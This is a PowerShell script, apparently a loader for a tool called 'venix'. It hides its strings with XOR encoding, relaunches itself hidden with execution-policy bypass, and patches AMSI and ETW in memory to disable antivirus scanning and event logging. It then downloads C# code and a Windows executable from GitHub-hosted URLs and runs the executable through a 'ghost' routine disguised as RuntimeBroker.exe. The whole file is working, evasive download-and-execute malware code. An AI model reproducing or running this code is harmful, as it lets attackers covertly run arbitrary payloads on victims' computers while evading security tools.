$ErrorActionPreference = 'Stop'

$k = 0x2E
function D([string]$h) {
    -join (0..([Math]::Floor($h.Length / 2) - 1) | ForEach-Object {
        [char]([Convert]::ToInt32($h.Substring($_ * 2, 2), 16) -bxor $k)
    })
}

$cWc    = D '604B5A00794B4C6D42474B405A'
$cStr   = D '6A41594042414F4A7D5A5C474049'
$cGh    = D '49475A465B4C'
$cCore  = D '465A5A5E5D1401015C4F590049475A465B4C5B5D4B5C4D41405A4B405A004D41430141545C4A01584B40475601434F474001584B404756034D415C4B004D5D'
$cDef   = D '465A5A5E5D1401015C4F590049475A465B4C5B5D4B5C4D41405A4B405A004D41430141545C4A01584B40475601434F474001584B404756004B564B'
$cRel   = D '465A5A5E5D14010149475A465B4C004D41430141545C4A01584B404756015C4B424B4F5D4B5D01424F5A4B5D5A014A41594042414F4A01584B4047560342414F4A4B5C004B564B'
$cData  = D '6A41594042414F4A6A4F5A4F'
$cAuth  = D '6F5B5A46415C47544F5A474140'
$cAT    = D '6F4A4A037A575E4B'
$cType  = D '784B4047566946415D5A'
$cSpoof = D '7C5B405A47434B6C5C41454B5C004B564B'
$cMutex = D '62414D4F4272585617481A4D1C4F194B1F4A164C1D1D'

$m = $null
try { $m = [System.Threading.Mutex]::OpenExisting($cMutex) } catch { }
if ($m) { $m.Dispose(); 'already running'; exit 0 }

if (-not [Environment]::Is64BitOperatingSystem) {
    'venix requires a 64-bit OS'
    exit 1
}
if (-not [Environment]::Is64BitProcess) {
    $cmd = "-nop -ep bypass -w hidden -c `"IEX((New-Object $cWc).$cStr('" + $MyInvocation.MyCommand.Path + "'))`""
    Start-Process -FilePath "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList $cmd -WindowStyle Hidden
    exit 0
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$null = Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class VnxP {
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
}
"@ -Namespace VnxN
$nop = [byte[]](0xC3)
foreach ($m in @(@('amsi','AmsiScanBuffer'), @('ntdll','EtwEventWrite'))) {
    try {
        $h = [VnxP]::GetModuleHandle($m[0] + '.dll')
        if ($h -eq [IntPtr]::Zero) { $h = [VnxP]::GetModuleHandle($m[0]) }
        $a = [VnxP]::GetProcAddress($h, $m[1])
        if ($a -ne [IntPtr]::Zero) {
            $old = 0; [VnxP]::VirtualProtect($a, 1, 0x40, [ref]$old) | Out-Null
            [System.Runtime.InteropServices.Marshal]::Copy($nop, 0, $a, 1)
        }
    } catch {}
}

$core = $null
try {
    $wc = New-Object $cWc
    if ($env:VENIX_LOADER_AUTH) { $wc.Headers.Add($cAuth, $env:VENIX_LOADER_AUTH) }
    if ($env:VENIX_CORE_URL) { $cCore = $env:VENIX_CORE_URL }
    $core = $wc.$cStr($cCore)
}
catch {
    'core fetch failed'
    exit 1
}

& $cAT -TypeDefinition $core

$t  = [type]$cType
$ghost = $t.GetMethod('RunGhost')

$u = $env:VENIX_LOADER_URL
if (-not $u) { $u = $cDef }
elseif ($u -ieq $cGh) { $u = $cDef }
elseif ($u -ieq 'release') { $u = $cRel }
elseif (-not $u.StartsWith('http://') -and -not $u.StartsWith('https://')) {
    $base = $cDef.Substring(0, $cDef.LastIndexOf('/') + 1)
    $u = if ($u.StartsWith('/')) { $base + $u.TrimStart('/') } else { $base + $u }
}
if (-not $u.StartsWith('http://') -and -not $u.StartsWith('https://')) { $u = $cDef }

try {
    $bytes = $wc.$cData($u)
}
catch {
    'loader fetch failed'
    exit 1
}
if ($bytes.Length -lt 0x400) { 'loader too small'; exit 1 }
if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) { 'not a PE (bad MZ)'; exit 1 }

$st = $ghost.Invoke($null, @([byte[]]$bytes, $cSpoof))
if ([int]$st -ne 0) {
    ('ghost execute failed with status 0x' + ('{0:X8}' -f $st))
    exit 1
}
'ok'
